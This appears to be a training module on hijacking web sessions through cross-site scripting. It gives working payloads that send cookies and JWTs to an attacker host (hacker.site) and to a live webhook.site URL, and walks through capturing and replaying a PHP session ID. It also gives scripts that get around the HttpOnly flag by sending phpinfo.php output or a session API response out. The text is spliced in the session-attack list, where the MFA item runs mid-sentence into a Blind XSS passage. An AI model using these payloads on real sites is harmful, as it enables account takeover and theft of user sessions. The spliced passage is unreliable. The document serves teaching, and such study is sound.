[[Cross-site Scripting (XSS)]]

## Session Hijacking Attack

Session hijacking refers to gaining access to a user's account in an application without knowing the username and password. When a user logs into an application, they are authenticated for a certain period without the need to continuously provide their credentials. This is possible because the server maintains an active session for the user.

### What is a Session ID?

To start this session, the server typically provides the user with a unique ID in the form of a **session cookie** or **bearer token**. This ID is stored in the browser and is included in all requests sent to the server, allowing the server to recognize and authenticate the active session for the user. This ID is of significant security importance because it authenticates the user and grants access to the application's functions without requiring the user's credentials.

Types of Session IDs

These values are generally randomly generated unique identifiers used to securely manage user sessions. Session IDs can be stored in the web browser’s cookies and sent to the server with every request, allowing the server to recognize the user and provide personalized information.

These values can be accessed within the browser's developer tools (F12) under the

Application > Cookies

or

Storage > Cookies

sections.

1. **PHP Session Variable:**
    
    - Name:
        
        PHPSESSID
        
    - Value:
        
        e3r4p17o32f4qe7s5toc2fc677
        
2. **ASP.NET Session Variable:**
    
    - Name:
        
        ASP.NET_SessionId
        
    - Value:
        
        tgx4p455zv0d0a55p4n3v055
        
3. **Java Servlet Session Variable:**
    
    - Name:
        
        JSESSIONID
        
    - Value:
        
        abcde12345ABCDE12345ABCDE1234567
        
4. **Ruby on Rails Session Variable:**
    
    - Name:
        
        _rails_session
        
    - Value:
        
        B3D9D1A37E3569012D9115F53A8B428C
        
5. **Express.js (Node.js) Session Variable:**
    
    - Name:
        
        connect.sid
        
    - Value:
        
        s%3A37RQhDE4f501Px2-OpCRGKJjv8CLN8Ss.%2B5PV%2B2C1
        
6. **JWT (JSON Web Token):**
    
    - Name:
        
        Authorization
        
    - Value:
        
        Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
        

### Common Session Hijacking Attacks

- **XSS (Cross-Site Scripting)**: XSS vulnerabilities can lead to the capture of session identifiers (sessions, tokens, JWT). These session identifiers can be sufficient to hijack user sessions.
    
- **Session Fixation**: Session IDs should be complex enough to render them impervious to brute-force attacks. Findable session IDs can lead to session hijacking.
    
- **Bypassing MFA (Multi-Factor Authentication)**: Multi-factor authentication requires a second (or more) authentication factor when a user logs in, such as a code sent via SMS or email. This mechanism prevents attackers from hijacking a user’s account solely based on passwords. If the session ID is captured, all authentication stages would have already been completed, allowing direct access to the application does not reflect the input directly as output but processes it on the server-side and later displays it in parts of the application such as admin panels, reporting tools, or other backend functionalities. It can also be referred to as a form of **Stored XSS**.
    

In a Blind XSS attack, an attacker sends input containing an XSS payload to the application. This input could be something like an error message, a user comment, or any data logged by the system. The application receives the input and stores it in the database or another storage medium, without directly using it as output. The malicious script is executed when the data is viewed by an administrator or another user. For example, the script may be activated when an administrator checks user comments or error logs.

Blind XSS attacks are often used to hijack the sessions of users with high privileges, such as administrators, who review user inputs or examine system logs.

### Application Areas Prone to Blind XSS Attacks

Payloads for Blind XSS attacks can be submitted in areas where user input is likely to be reviewed by other users or system administrators at a later time:

1. **Contact Forms**: Information entered by users into contact form fields, usually reviewed by support teams.
2. **Comment Sections**: Comments on blogs, news sites, or product pages, visible to other visitors or site administrators.
3. **User Profile Fields**: Sections where users introduce themselves, like biography or "about me" areas, generally visible to other users.
4. **Order Forms**: Details entered by users such as name, address, etc., reviewed during order processing and by customer service.
5. **Support Ticket Systems**: Information entered into support or issue reporting forms, reviewed by the technical support team.
6. **Product Reviews**: Reviews on e-commerce sites, typically visible to other customers and site administrators.
7. **Forum Posts**: Discussion forums where user messages are read by other members.
8. **Surveys and Feedback Forms**: User feedback or survey responses, analyzed and reported on later.

These data entry points provide attackers with opportunities to inject malicious JavaScript code, which may be triggered when reviewed by system administrators or other users.

### XSS Vulnerability Leading to Session Hijacking

XSS attacks are executed using JavaScript code running in the user's browser. A malicious script can capture session cookies or session tokens stored in the browser. Since these tokens and cookies are used to authenticate the user and maintain sessions in the web application, capturing them can lead to account takeover attacks.

- **Stealing Cookies:**

```auto
<script>fetch("https://hacker.site?data=" + document.cookie);</script>
```

This script steals the user's cookies, including session cookies, and sends them to a malicious website or an intercepting server using an HTTP GET request. The attacker can use these cookies to hijack the user's session.

- **Stealing JWT Tokens:**

```auto
<script>fetch("https://hacker.site?data=" + localStorage.getItem('JWT'));</script>
```

In modern web applications, session tokens like JSON Web Tokens (JWTs) are often stored in local storage (

localStorage

or

sessionStorage

). This script steals the user's JWT and sends it to a malicious website or an intercepting server.

Demonstration

![](https://storage.hackviser.com/file/hackviser-prod/trainings/sections/images/efd9d5ea-dad1-4499-bde8-21b87814d9fb/webhook-home-9899465d0.webp)

To capture and view the stolen session ID, a web server that can capture HTTP requests is needed. This can be achieved using web services that offer such functionality. In this example, the **webhook.site** service will be used. This service is available for free online and allows capturing and analyzing incoming HTTP requests.

The URL under the heading "Your unique URL" will capture various HTTP requests. This URL will be used inside the XSS payload.

Alternative web services:

- pipedream.com
- requestbin.myworkato.com

Alternatively, you could set up an HTTP server on a publicly accessible server that can directly communicate with the target, allowing you to capture incoming HTTP requests easily. For example, you can create a simple HTTP server using Python to view incoming requests.

**Note:** If the target system does not have internet access, you can choose a local network Python HTTP server.

![](https://storage.hackviser.com/file/hackviser-prod/trainings/sections/images/efd9d5ea-dad1-4499-bde8-21b87814d9fb/python-server-0582583e1.webp)

```auto
python3 -m http.server 8080
```

![](https://storage.hackviser.com/file/hackviser-prod/trainings/sections/images/efd9d5ea-dad1-4499-bde8-21b87814d9fb/session-hijacking-payload-7a39c3b37.webp)

At this stage, the XSS payload is prepared with the webhook URL included. The payload sends an HTTP request with the cookie information stored in the browser as a

data

GET parameter using the

fetch

function to the specified address.

```auto
<script>fetch("https://webhook.site/ac2a452b-4f51-4762-82c5-6d0c6ecf6bdc?data=" + document.cookie);</script>
```

![](https://storage.hackviser.com/file/hackviser-prod/trainings/sections/images/efd9d5ea-dad1-4499-bde8-21b87814d9fb/session-hijacking-message-3ab5394c9.webp)

After sending the payload, it appears as a blank message viewable by any user who reads it. Since the JavaScript code executes in the browser of each user who views the message, the cookie information of all users on the website can be captured.

![](https://storage.hackviser.com/file/hackviser-prod/trainings/sections/images/efd9d5ea-dad1-4499-bde8-21b87814d9fb/webhook-session-f5049237a.webp)

When checking the webhook logs, an incoming request is observed. The GET parameter

?data=PHPSESSID=50kkdorpjgqm5r2hvfgv400cj3

is visible, indicating that it is a session ID used in PHP web applications.

![](https://storage.hackviser.com/file/hackviser-prod/trainings/sections/images/efd9d5ea-dad1-4499-bde8-21b87814d9fb/dev-tools-session-80babeece.webp)

The stolen session ID can be entered in the browser's developer tools (F12) under

Application > Cookies

or

Storage > Cookies

, or by altering the

Cookie

value in the HTTP requests to hijack another user's session. By using the session ID, actions can be performed using the victim’s account as if they were performed by that user.

In this example, there is a Stored XSS vulnerability, but the type of XSS vulnerability is not important for these steps. It just needs to be viewed by other users. For instance, the same applies to Reflected XSS or DOM-based XSS vulnerabilities.

```auto
https://example.com/home?search=<script>fetch("https://webhook.site/ac2a452b-4f51-4762-82c5-6d0c6ecf6bdc?data=" + document.cookie);</script>
```

Users visiting this URL would have their session IDs captured.

### HTTPOnly Flag and Bypass Methods

The

HttpOnly

cookie flag is a crucial security mechanism used in web applications. This flag ensures that a cookie can only be accessed via HTTP and prevents JavaScript from reading these cookies. This feature serves as a defense against XSS (Cross-Site Scripting) attacks by preventing the reading of cookies via JavaScript.

However, while no security system is foolproof, there are scenarios where the

HttpOnly

flag can be bypassed. These scenarios typically involve situations where cookies are not exposed to JavaScript but can still be accessed indirectly.

Bypassing HttpOnly Flag

1. If a file like
    
    phpinfo.php
    
    exists on the target website, you can capture the
    
    HttpOnly
    
    cookies by making the victim visit this file.

```auto
<script>
  fetch("http://example.com/phpinfo.php", {credentials: "include"})
  .then(response => response.text())
  .then(data => {
    const base64Data = btoa(data);
    return fetch("http://hacker.site/?data=" + base64Data);
  })
</script>
```

2. If there is a known address or API endpoint that returns session IDs, you can capture these details by making the victim visit that address.

```auto
<script>
  fetch("http://example.com/api/session", {credentials: "include"})
  .then(response => response.json())
  .then(data => {
    return fetch("http://hacker.site/?data=" + data.sessionId);
  })
</script>
```

3. If session IDs are stored in
    
    localStorage
    
    or
    
    sessionStorage
    
    , they can be captured because these storage mechanisms do not support the
    
    HttpOnly
    
    flag.

```auto
<script>fetch("https://hacker.site?data=" + localStorage.getItem('JWT'));</script>
```